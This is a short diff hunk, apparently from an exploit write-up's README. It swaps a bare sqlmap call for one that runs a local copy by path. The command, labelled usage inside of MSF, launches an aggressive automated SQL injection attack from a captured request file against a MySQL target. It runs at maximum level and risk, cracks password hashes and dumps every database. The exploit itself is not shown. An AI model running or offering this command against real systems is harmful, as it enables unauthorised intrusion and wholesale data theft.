@@ -124,7 +124,7 @@ run
 
 # usage inside of MSF:
 ```
-sqlmap -r exploit.txt --no-cast --no-escape --dbms=mysql --time-sec=11 --random-agent --level=5 --risk=3 --common-tables --common-columns --common-files --batch --flush-session --technique=TBEUSQ --union-char=UCHAR --answers="crack=Y,dict=Y,continue=Y,quit=N" --dump-all
+python3 /home/kali/sqlmap-nu11secur1ty/sqlmap.py -r exploit.txt --no-cast --no-escape --dbms=mysql --time-sec=11 --random-agent --level=5 --risk=3 --common-tables --common-columns --common-files --batch --flush-session --technique=TBEUSQ --union-char=UCHAR --answers="crack=Y,dict=Y,continue=Y,quit=N" --dump-all
 ```
 
 
